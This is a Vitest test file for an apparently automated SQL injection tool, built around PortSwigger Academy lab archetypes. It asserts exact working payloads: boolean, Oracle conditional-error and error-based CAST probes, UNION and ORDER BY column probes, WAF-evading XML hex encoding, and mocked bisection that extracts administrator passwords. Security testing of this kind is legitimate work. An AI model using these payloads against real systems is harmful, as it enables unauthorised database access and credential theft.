import { describe, it, expect } from 'vitest';
import { RequestParser } from './RequestParser';
import { ContextDetector } from './ContextDetector';
import { BooleanTester } from './BooleanTester';
import { ErrorTester } from './ErrorTester';
import { TimeBasedTester } from './TimeBasedTester';
import { UnionTester } from './UnionTester';
import { AdaptivePayloadEngine } from './AdaptivePayloadEngine';
import { MetadataExtractor } from './MetadataExtractor';
import { AdaptiveRetryTree } from './engine/AdaptiveRetryTree';
import { SQLDefenseLayerModel } from './engine/SQLDefenseLayerModel';

describe('Sentinel SQL X — PortSwigger Academy Lab Archetypes Self-Test', () => {

  // ─── Lab 11: Blind SQLi with Conditional Responses ───────────────────
  describe('Lab Archetype 11: Conditional Responses (Differential Text)', () => {
    const baselineHtml = `<!DOCTYPE html><html><body><header><h1>ACME Shop</h1></header><div class="greeting"><p>Welcome back</p></div><div class="products">Product List</div></body></html>`;
    const trueHtml = `<!DOCTYPE html><html><body><header><h1>ACME Shop</h1></header><div class="greeting"><p>Welcome back</p></div><div class="products">Product List</div></body></html>`;
    const falseHtml = `<!DOCTYPE html><html><body><header><h1>ACME Shop</h1></header><div class="greeting"></div><div class="products">Product List</div></body></html>`;

    it('isolates the "Welcome back" differential marker', () => {
      const markers = BooleanTester.extractUniqueDifferentialMarkers(trueHtml, falseHtml, "' AND '1'='1", "' AND '1'='2", baselineHtml);
      expect(markers).toContain('Welcome back');
    });

    it('confirms vulnerability with >= 95% confidence on marker divergence', () => {
      const evalResult = BooleanTester.evaluateDifferential(
        baselineHtml, 200,
        trueHtml, 200,
        falseHtml, 200,
        "' AND '1'='1", "' AND '1'='2"
      );
      expect(evalResult.isVulnerable).toBe(true);
      expect(evalResult.confidence).toBeGreaterThanOrEqual(95);
      expect(evalResult.uniqueMarker).toBe('Welcome back');
      expect(evalResult.evidence).toContain('Welcome back');
    });

    it('calibrates AdaptivePayloadEngine with marker strategy and classifies dynamically', () => {
      const engine = new AdaptivePayloadEngine('PostgreSQL');
      const calibration = engine.calibrate(
        [{ body: trueHtml, status: 200 }],
        [{ body: falseHtml, status: 200 }]
      );
      expect(calibration.strategy).toBe('marker');
      expect(calibration.marker).toBe('Welcome back');
      expect(calibration.confidence).toBeGreaterThanOrEqual(95);

      expect(engine.classifyResponse(trueHtml, 200)).toBe('TRUE');
      expect(engine.classifyResponse(falseHtml, 200)).toBe('FALSE');
    });

    it('synthesizes exact PortSwigger table existence probe for "users"', () => {
      const engine = new AdaptivePayloadEngine('PostgreSQL');
      engine.setQuoteStyle('balanced');
      const probe = engine.generateTableProbe('users');
      expect(probe.truePayload).toBe("' AND (SELECT 'a' FROM users LIMIT 1)='a");
      expect(probe.falsePayload).toBe("' AND (SELECT 'a' FROM users LIMIT 1)='b");
    });

    it('synthesizes exact PortSwigger entity probe for "administrator"', () => {
      const engine = new AdaptivePayloadEngine('PostgreSQL');
      engine.setQuoteStyle('balanced');
      const probe = engine.generateEntityProbe('users', "username='administrator'");
      expect(probe.truePayload).toBe("' AND (SELECT 'a' FROM users WHERE username='administrator')='a");
    });

    it('synthesizes exact PortSwigger binary search length probe', () => {
      const engine = new AdaptivePayloadEngine('PostgreSQL');
      engine.setQuoteStyle('balanced');
      const probe = engine.generateLengthProbe('users', 'password', "username='administrator'", 1);
      expect(probe).toBe("' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a");
    });

    it('synthesizes exact deterministic length probe for verification', () => {
      const engine = new AdaptivePayloadEngine('PostgreSQL');
      engine.setQuoteStyle('balanced');
      const probe = engine.generateExactLengthProbe('users', 'password', "username='administrator'", 20);
      expect(probe).toBe("' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a");
    });

    it('synthesizes exact PortSwigger character extraction probe', () => {
      const engine = new AdaptivePayloadEngine('PostgreSQL');
      engine.setQuoteStyle('balanced');
      const probe = engine.generateCharProbe('users', 'password', "username='administrator'", 1, 'a');
      expect(probe).toBe("' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a");
    });

    it('ensures commented quote style safely terminates strings before comment token', () => {
      const engine = new AdaptivePayloadEngine('PostgreSQL');
      engine.setQuoteStyle('commented');
      const probe = engine.generateCharProbe('users', 'password', "username='administrator'", 1, 'a');
      expect(probe).toBe("' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'-- ");
    });
  });

  // ─── Lab 12: Blind SQLi with Conditional Errors ──────────────────────
  describe('Lab Archetype 12: Conditional Errors (Status Code Divergence & Oracle String Breakout)', () => {
    it('confirms vulnerability when FALSE/Error triggers HTTP 500 divergence (Error-on-False)', () => {
      const evalResult = BooleanTester.evaluateDifferential(
        'OK', 200,
        'OK', 200,
        'Internal Server Error', 500,
        "' AND (SELECT CASE WHEN (1=1) THEN 'a' ELSE 1/0 END)='a",
        "' AND (SELECT CASE WHEN (1=2) THEN 'a' ELSE 1/0 END)='a"
      );
      expect(evalResult.isVulnerable).toBe(true);
      expect(evalResult.confidence).toBeGreaterThanOrEqual(95);
      expect(evalResult.divergenceType).toBe('status_divergence');
      expect(evalResult.divergencePolarity).toBe('error_on_false');
      expect(evalResult.isConditionalError).toBe(true);
    });

    it('confirms vulnerability when TRUE triggers HTTP 500 divergence (Error-on-True, PortSwigger Oracle pattern)', () => {
      const evalResult = BooleanTester.evaluateDifferential(
        'OK', 200,
        'Internal Server Error', 500,
        'OK', 200,
        "'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
        "'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"
      );
      expect(evalResult.isVulnerable).toBe(true);
      expect(evalResult.confidence).toBeGreaterThanOrEqual(95);
      expect(evalResult.divergenceType).toBe('status_divergence');
      expect(evalResult.divergencePolarity).toBe('error_on_true');
      expect(evalResult.isConditionalError).toBe(true);
    });

    it('calibrates AdaptivePayloadEngine for Error-on-True status classification (500=TRUE, 200=FALSE)', () => {
      const engine = new AdaptivePayloadEngine('Oracle');
      engine.setConditionalErrorMode(true);
      engine.setQuoteStyle('concatenation');

      const cal = engine.calibrate(
        [{ body: 'Internal Server Error', status: 500 }],
        [{ body: 'OK', status: 200 }]
      );
      expect(cal.strategy).toBe('status');
      expect(cal.expectedTrueStatus).toBe(500);
      expect(cal.expectedFalseStatus).toBe(200);
      expect(cal.isConditionalError).toBe(true);
      expect(cal.confidence).toBe(98);

      // Verify classification: HTTP 500 must map to TRUE, HTTP 200 to FALSE
      expect(engine.classifyResponse('Error', 500)).toBe('TRUE');
      expect(engine.classifyResponse('Normal', 200)).toBe('FALSE');
    });

    it('generates Oracle conditional error probes for table, entity, length, and ASCII binary search', () => {
      const engine = new AdaptivePayloadEngine('Oracle');
      engine.setConditionalErrorMode(true);
      engine.setQuoteStyle('concatenation');

      // Table probe
      const tblProbe = engine.generateConditionalErrorTableProbe('users');
      expect(tblProbe.truePayload).toBe("'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1)||'");
      expect(tblProbe.falsePayload).toBe("'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1)||'");

      // Entity probe
      const entityProbe = engine.generateConditionalErrorEntityProbe('users', "username='administrator'");
      expect(entityProbe.truePayload).toBe("'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'");

      // Length binary search probe
      const lenProbe = engine.generateConditionalErrorLengthProbe('users', 'password', "username='administrator'", 20);
      expect(lenProbe).toBe("'||(SELECT CASE WHEN (LENGTH(password)>20) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'");

      // Exact length verification probe
      const exactProbe = engine.generateConditionalErrorExactLengthProbe('users', 'password', "username='administrator'", 20);
      expect(exactProbe).toBe("'||(SELECT CASE WHEN (LENGTH(password)=20) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'");

      // ASCII binary search probe
      const asciiProbe = engine.generateConditionalErrorAsciiProbe('users', 'password', "username='administrator'", 1, 97);
      expect(asciiProbe).toBe("'||(SELECT CASE WHEN (ASCII(SUBSTR(password,1,1))>97) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'");

      // Character equality probe
      const charProbe = engine.generateConditionalErrorCharProbe('users', 'password', "username='administrator'", 1, 'a');
      expect(charProbe).toBe("'||(SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'");
    });
  });

  // ─── Lab 13: Visible Error-Based SQLi ────────────────────────────────
  describe('Lab Archetype 13: Visible Error-Based (CAST / Type Conversion Data Leakage)', () => {
    it('detects PostgreSQL type conversion leakage and HTML entity decoded data', () => {
      const errorBody = `org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: &quot;administrator_pwd_1337&quot;`;
      const leaked = MetadataExtractor.extractErrorBasedData(errorBody);
      expect(leaked).toBe('administrator_pwd_1337');

      const match = ErrorTester.analyzeResponse(errorBody);
      expect(match?.dbms).toBe('PostgreSQL');
      expect(match?.leakedData).toBe('administrator_pwd_1337');
    });

    it('detects MSSQL conversion leakage', () => {
      const errorBody = `Conversion failed when converting the varchar value 's3cr3t_token' to data type int.`;
      const leaked = MetadataExtractor.extractErrorBasedData(errorBody);
      expect(leaked).toBe('s3cr3t_token');

      const match = ErrorTester.analyzeResponse(errorBody);
      expect(match?.dbms).toBe('Microsoft SQL Server');
      expect(match?.leakedData).toBe('s3cr3t_token');
    });

    it('detects MySQL XPATH syntax error leakage', () => {
      const errorBody = `XPATH syntax error: '~mypassword123'`;
      const leaked = MetadataExtractor.extractErrorBasedData(errorBody);
      expect(leaked).toBe('mypassword123');

      const match = ErrorTester.analyzeResponse(errorBody);
      expect(match?.dbms).toBe('MySQL');
      expect(match?.leakedData).toBe('mypassword123');
    });

    it('includes precision CAST and CONVERT type-conversion probes across multiple DBMS dialects', () => {
      const probes = ErrorTester.getPrecisionErrorProbes();
      expect(probes.some(p => p.payload.includes('CAST((SELECT 1) AS int)'))).toBe(true);
      expect(probes.some(p => p.payload.includes('CONVERT(int, (SELECT 1))'))).toBe(true);
      expect(probes.some(p => p.payload.includes('EXTRACTVALUE(1, CONCAT(0x7e, @@version))'))).toBe(true);
      expect(probes.some(p => p.payload.includes('CTXSYS.DRITHSX.SN'))).toBe(true);
    });

    it('generates ultra-compact table discovery queries (< 80 chars) to survive backend length limits', () => {
      const dummyParam = {
        id: 'p1', name: 'TrackingId', location: 'cookie' as const, originalValue: 'xyz',
        detectedContext: 'single_quote_string' as const, confidence: 'High' as const,
        evidence: [], enabled: true,
      };
      const queries = MetadataExtractor.getErrorBasedTableQueries(dummyParam, 0, 'PostgreSQL', true);
      const compact = queries[0];
      expect(compact.length).toBeLessThan(85);
      expect(compact).toContain('CAST((SELECT table_name FROM information_schema.tables');
    });

    it('generates targeted single-query administrator credential extraction query (< 85 chars)', () => {
      const dummyParam = {
        id: 'p1', name: 'TrackingId', location: 'cookie' as const, originalValue: 'xyz',
        detectedContext: 'single_quote_string' as const, confidence: 'High' as const,
        evidence: [], enabled: true,
      };
      const queries = MetadataExtractor.getErrorBasedRowQueries(
        dummyParam, 'users', 'password', 0, 'PostgreSQL', true, "username='administrator'"
      );
      const targeted = queries[0];
      expect(targeted.length).toBeLessThanOrEqual(90);
      expect(targeted).toBe("' AND 1=CAST((SELECT password FROM users WHERE username='administrator' LIMIT 1) AS int)--");
    });
  });

  // ─── Lab 3 & 4: UNION Attacks (Column Count & Canaries) ──────────────
  describe('Lab Archetypes 3 & 4: UNION Column Counting & Canary Identification', () => {
    const rawReq = `GET /filter?category=Gifts HTTP/1.1\r\nHost: target.local\r\n\r\n`;
    const parsed = RequestParser.parse(rawReq);
    const param = parsed.parameters.find(p => p.name === 'category')!;

    it('generates ORDER BY probes to discover boundary errors', () => {
      const probes = UnionTester.getOrderByProbes(param, 5);
      expect(probes.length).toBe(5);
      expect(probes[0].payload).toBe("' ORDER BY 1-- -");
      expect(probes[2].payload).toBe("' ORDER BY 3-- -");
    });

    it('generates NULL-padded UNION probes', () => {
      const nullProbes = UnionTester.getNullUnionProbes(param, 3);
      expect(nullProbes.some(p => p.payload.includes('UNION SELECT NULL,NULL,NULL'))).toBe(true);
    });

    it('generates canary probes to locate renderable text columns', () => {
      const canaries = UnionTester.getPerColumnCanaryProbes(param, 3);
      expect(canaries.length).toBe(12);
      expect(canaries[0].canaryMarker).toBe('SENTINEL_CANARY_01');
      expect(canaries[0].payload).toContain("'SENTINEL'||'_CANARY_01'");
    });
  });

  // ─── Lab 14 & 15: Time-Based Delay Verification ──────────────────────
  describe('Lab Archetypes 14 & 15: Time-Based Delay Verification', () => {
    it('statistically verifies genuine database sleep injection', () => {
      const baselines = [45, 52, 48, 50, 47];
      const evaluation = TimeBasedTester.evaluateTiming(baselines, 10050, 10, 'PostgreSQL');
      expect(evaluation.isVulnerable).toBe(true);
      expect(evaluation.confidence).toBeGreaterThanOrEqual(95);
    });

    it('rejects transient network spikes below threshold', () => {
      const baselines = [50, 50, 50];
      const evaluation = TimeBasedTester.evaluateTiming(baselines, 400, 10, 'PostgreSQL');
      expect(evaluation.isVulnerable).toBe(false);
    });
  });

  // ─── Lab 1 & 2: WHERE Clause Breakout & Authentication Bypass ────────
  describe('Lab Archetypes 1 & 2: WHERE Clause Breakout & Auth Bypass', () => {
    it('detects single quote string context on Cookie parameter', () => {
      const raw = `GET / HTTP/1.1\r\nHost: target.local\r\nCookie: TrackingId=xyz123; session=abc\r\n\r\n`;
      const parsed = RequestParser.parse(raw);
      const trackingParam = parsed.parameters.find(p => p.name === 'TrackingId')!;
      expect(trackingParam).toBeDefined();
      expect(trackingParam.location).toBe('cookie');

      const ctx = ContextDetector.detectContext(trackingParam, raw);
      expect(ctx).toBe('single_quote_string');
    });

    it('injects payload into Cookie header preserving surrounding cookies', () => {
      const raw = `GET / HTTP/1.1\r\nHost: target.local\r\nCookie: TrackingId=xyz123; session=abc\r\n\r\n`;
      const parsed = RequestParser.parse(raw);
      const trackingParam = parsed.parameters.find(p => p.name === 'TrackingId')!;

      const injected = RequestParser.injectPayload(parsed, trackingParam, "' AND '1'='1", true);
      const cookieHeader = injected.headers.find(h => h.name.toLowerCase() === 'cookie');
      expect(cookieHeader?.value).toContain("TrackingId=xyz123'+AND+'1'='1");
      expect(cookieHeader?.value).toContain("session=abc");
    });
  });

  // ─── Lab: SQL Injection with Filter Bypass via XML Encoding ───────────
  describe('Lab Archetype: Filter Bypass via XML Encoding (Hex Entities)', () => {
    const rawXmlReq = `POST /product/stock HTTP/1.1\r\nHost: target.local\r\nContent-Type: application/xml\r\n\r\n<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>`;

    it('parses XML elements and detects numeric context on integer values', () => {
      const parsed = RequestParser.parse(rawXmlReq);
      expect(parsed.isXml).toBe(true);
      const storeParam = parsed.parameters.find((p) => p.name === 'storeId')!;
      expect(storeParam).toBeDefined();
      expect(storeParam.location).toBe('body_xml');
      expect(storeParam.originalValue).toBe('1');

      const ctx = ContextDetector.detectContext(storeParam, rawXmlReq);
      expect(ctx).toBe('numeric');
    });

    it('adapts blocked raw UNION probes to full XML hexadecimal entities for WAF evasion', () => {
      const parsed = RequestParser.parse(rawXmlReq);
      const storeParam = parsed.parameters.find((p) => p.name === 'storeId')!;
      const rawUnionPayload = ' UNION SELECT NULL-- -';

      const defenseModel = new SQLDefenseLayerModel();
      const decision = AdaptiveRetryTree.evaluateAndBranch(
        rawUnionPayload,
        storeParam,
        'Generic SQL',
        'numeric',
        400,
        { 'content-type': 'application/json' },
        'Attack detected',
        defenseModel
      );

      expect(decision.action).toBe('ADAPT_PARSER_DIFFERENTIAL');
      expect(decision.transformationId).toBe('DIFF_XML_FULL_HEX_ENTITY');
      // Verify wire request injection
      const injected = RequestParser.injectPayload(parsed, storeParam, decision.wirePayload, true);
      expect(injected.rawRequest).toContain('<storeId>1');
      expect(injected.rawRequest).toContain('&#x55;&#x4e;&#x49;&#x4f;&#x4e;');
    });
  });

  // ─── Universal BlindDataExtractor Bisection Tests ───────────────────
  describe('Universal BlindDataExtractor: Autonomous Binary Search Bisection', () => {
    it('guarantees Oracle conditional error probes are in the top 4 quick mode probes', () => {
      const dummyParam = {
        id: 'p1', name: 'TrackingId', location: 'cookie' as const, originalValue: 'xyz',
        detectedContext: 'single_quote_string' as const, confidence: 'High' as const,
        evidence: [], enabled: true,
      };
      const pairs = BooleanTester.getTestPairs(dummyParam);
      const top4 = pairs.slice(0, 4);
      expect(top4.some((p) => p.name.includes('Oracle') && p.isConditionalError)).toBe(true);
      expect(top4.some((p) => p.truePayload.includes('TO_CHAR(1/0)'))).toBe(true);
    });

    it('extracts password accurately via simulated Oracle conditional errors bisection', async () => {
      const targetPassword = 'secret_password_1337';
      const dummyTable = {
        id: 'tbl_users',
        name: 'users',
        schema: 'public',
        classification: 'application' as const,
        isSensitive: true,
        columns: [
          { name: 'username', dataType: 'VARCHAR', isNullable: false, isPrimaryKey: true, isForeignKey: false, isIndexed: false, isSensitive: false, confidence: 'Confirmed' as const, discoveredAt: 0 },
          { name: 'password', dataType: 'VARCHAR', isNullable: false, isPrimaryKey: false, isForeignKey: false, isIndexed: false, isSensitive: true, confidence: 'Confirmed' as const, discoveredAt: 0 },
        ],
        discoveredAt: 0,
        status: 'columns_ready' as const,
      };

      // Mock database backend that triggers HTTP 500 when condition is TRUE
      const mockSender = async (payload: string) => {
        let isTrue = false;
        if (payload.includes("username='administrator'")) {
          const lenMatch = /LENGTH\(password\)>(\d+)/.exec(payload);
          if (lenMatch) {
            isTrue = targetPassword.length > parseInt(lenMatch[1], 10);
          }
          const exactLenMatch = /LENGTH\(password\)=(\d+)/.exec(payload);
          if (exactLenMatch) {
            isTrue = targetPassword.length === parseInt(exactLenMatch[1], 10);
          }
          const asciiMatch = /ASCII\(SUBSTR\(password,(\d+),1\)\)>(\d+)/.exec(payload);
          if (asciiMatch) {
            const pos = parseInt(asciiMatch[1], 10);
            const mid = parseInt(asciiMatch[2], 10);
            const code = targetPassword.charCodeAt(pos - 1);
            isTrue = code > mid;
          }
          if (!lenMatch && !exactLenMatch && !asciiMatch) {
            isTrue = true; // entity existence check
          }
        }
        return {
          body: isTrue ? 'Internal Server Error' : 'OK',
          status: isTrue ? 500 : 200,
          durationMs: 50,
        };
      };

      const { BlindDataExtractor } = await import('./engine/BlindDataExtractor');
      const extractor = new BlindDataExtractor(mockSender, {
        dbms: 'Oracle',
        technique: 'CONDITIONAL_ERROR',
        errorPolarity: 'error_on_true',
      });

      const extracted = await extractor.extractTableRow(dummyTable, 'administrator');
      expect(extracted).not.toBeNull();
      expect(extracted?.username).toBe('administrator');
      expect(extracted?.password).toBe(targetPassword);
    });

    it('extracts password accurately via simulated PostgreSQL time-delay bisection', async () => {
      const targetPassword = 'blind_time_admin_pass';
      const dummyTable = {
        id: 'tbl_users',
        name: 'users',
        schema: 'public',
        classification: 'application' as const,
        isSensitive: true,
        columns: [
          { name: 'username', dataType: 'VARCHAR', isNullable: false, isPrimaryKey: true, isForeignKey: false, isIndexed: false, isSensitive: false, confidence: 'Confirmed' as const, discoveredAt: 0 },
          { name: 'password', dataType: 'VARCHAR', isNullable: false, isPrimaryKey: false, isForeignKey: false, isIndexed: false, isSensitive: true, confidence: 'Confirmed' as const, discoveredAt: 0 },
        ],
        discoveredAt: 0,
        status: 'columns_ready' as const,
      };

      // Mock database backend that introduces 2000ms delay when condition is TRUE
      const mockSender = async (payload: string) => {
        let isTrue = false;
        if (payload.includes("username='administrator'")) {
          const lenMatch = /LENGTH\(password\)>(\d+)/.exec(payload);
          if (lenMatch) {
            isTrue = targetPassword.length > parseInt(lenMatch[1], 10);
          }
          const exactLenMatch = /LENGTH\(password\)=(\d+)/.exec(payload);
          if (exactLenMatch) {
            isTrue = targetPassword.length === parseInt(exactLenMatch[1], 10);
          }
          const asciiMatch = /ASCII\(SUBSTRING\(password,(\d+),1\)\)>(\d+)/.exec(payload);
          if (asciiMatch) {
            const pos = parseInt(asciiMatch[1], 10);
            const mid = parseInt(asciiMatch[2], 10);
            const code = targetPassword.charCodeAt(pos - 1);
            isTrue = code > mid;
          }
          if (!lenMatch && !exactLenMatch && !asciiMatch) {
            isTrue = true; // entity check
          }
        }
        return {
          body: 'OK',
          status: 200,
          durationMs: isTrue ? 2100 : 50,
        };
      };

      const { BlindDataExtractor } = await import('./engine/BlindDataExtractor');
      const extractor = new BlindDataExtractor(mockSender, {
        dbms: 'PostgreSQL',
        technique: 'TIME',
        timeDelaySeconds: 2,
        baselineDurationMs: 50,
      });

      const extracted = await extractor.extractTableRow(dummyTable, 'administrator');
      expect(extracted).not.toBeNull();
      expect(extracted?.username).toBe('administrator');
      expect(extracted?.password).toBe(targetPassword);
    });
  });
});

